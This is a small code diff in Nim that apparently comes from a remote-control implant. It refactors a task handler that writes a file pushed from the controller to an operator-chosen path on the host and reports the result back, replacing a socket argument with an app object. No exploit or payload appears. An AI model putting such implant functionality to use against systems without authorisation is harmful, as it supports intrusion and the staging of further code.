@@ -1,7 +1,7 @@
 import net, base64, json
-import ../client/communication
+import ../client/[communication, types]
 
-proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
+proc executeTask*(app: App, taskId: int, params: seq[string]) =
   let taskOutput = TaskOutput(
     task: "output",
     taskId: taskId,
@@ -13,4 +13,4 @@ proc executeTask*(socket: Socket, taskId: int, params: seq[string]) =
   writeFile(params[1], fileContents)
   
   taskOutput.addData(Text, "result", "received file " & params[1] & " (length: " & $len(fileContents) & ")")
-  socket.sendOutput(taskOutput)
+  app.sendOutput(taskOutput)
